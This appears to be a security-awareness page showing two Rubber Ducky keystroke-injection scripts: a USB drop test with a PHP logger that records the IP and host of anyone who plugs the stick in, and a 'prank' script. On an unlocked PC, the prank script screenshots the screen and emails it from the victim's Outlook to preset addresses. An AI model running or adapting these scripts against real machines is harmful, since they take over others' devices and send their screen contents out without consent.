[Back to Main Page](../index.html) 

# Rubber Ducky

<img src="../img/banner_hackerblue.jpg" width="1000">

## Rubber Ducky Dropoff Attack

Recently we decided to test our employees by dropping off a modified Rubber Ducky outside of the building and creating awareness for such social attacks. The DuckyCode opens up a webpage.php, which tracks the device and logs it on logfile which has been placed on the webserver.

This is the uncompiled payload.

```
DELAY 1000
GUI r
DELAY 100
STRING https://company.tld/rubduck/link.php // insert link here
ENTER
```

The .php was created and loaded into our webpage by one of my colleagues, the code is basically this:

```php
<?php

$file = 'log.txt';
$entry = file_get_contents($file);
$time = date('Y-m-d H:i:s', time());
if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    $entry .= sprintf('%s: New RubberDucky initialisation detected from %s' . PHP_EOL, $time, $ip);
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
    $host = gethostbyaddr($_SERVER['REMOTE_ADDR']);
    $entry .= sprintf('%s: New RubberDucky initialisation detected from %s, %s' . PHP_EOL, $time, $host, $ip);
}
file_put_contents($file, $entry);

header('Location: ' . 'https://google.com');
die();
```
  
After creating the payload we inject it on the USB, by placing the inject.bin in the root directory. A few days after dropping it off, we had the results we wanted to see:

```
2021-11-18 20:04:58: New RubberDucky initialisation detected from 192.168.1.105, 192.168.1.105
2021-11-18 20:05:45: New RubberDucky initialisation detected from 192.168.1.105, 192.168.1.105
2021-11-18 20:06:12: New RubberDucky initialisation detected from 192.168.1.105, 192.168.1.105
2021-11-18 20:06:31: New RubberDucky initialisation detected from 192.168.1.105, 192.168.1.105
2021-11-18 20:08:38: New RubberDucky initialisation detected from 192.168.1.105, 192.168.1.105
```

## Rubber Ducky Automailer Prank

To remind people to never keep their PC unlocked, I have created a second script for the RubberDucky. It allows me to plug the USB in an unlocked device, wait while it causes some mischief. The script snaps a screenshot, opens outlook, sends a message to various people with pre-configured text, adds screenshot and opens up a muted one hour rickroll youtube video once done. 

This configuration works a little better than most others you could find on github as it uses `outlook.exe /c ipm.note /m` instead of opening the outlook messenger somehow different.

```
REM Title:          Automailer
REM Author:	    Ratcode404
REM Description:    Snaps screen, opens outlook, sends a message to various people with pre-configured text, adds screenshot and opens up a muted 1 hour rickroll youtube video once done.

REM Default Delay (350 should be mid-speed)
DEFAULT_DELAY 350

REM Take screenshot
SHIFT WINDOWS S
DELAY 200
TAB
TAB
TAB
TAB
ENTER
DELAY 300

REM Open Outlook (Change E-Mail and text)
GUI r
DELAY 100
STRING outlook.exe /c ipm.note /m ratcode404@notarealmail.com?v=1&cc=ratcode405@notarealmail.com
ENTER
DELAY 500
STRING Subject goes here.
TAB
STRING Hello Ratcode!
ENTER 
STRING I like to leave my device unlocked and would want to invite you to some free dinner tonight.
ENTER
STRING xoxo

REM Paste Screenshot in Mail (CTRL V)
SHIFT INSERT
DELAY 200

REM Send Mail
ALT S
ENTER
DELAY 200

REM Rickroll, Mute and Fullscreen (Can adjust link obviously)
GUI r
DELAY 100
STRING https://www.youtube.com/watch?v=zL19uMsnpSU
ENTER
DELAY 300
M
DELAY 200
F
```
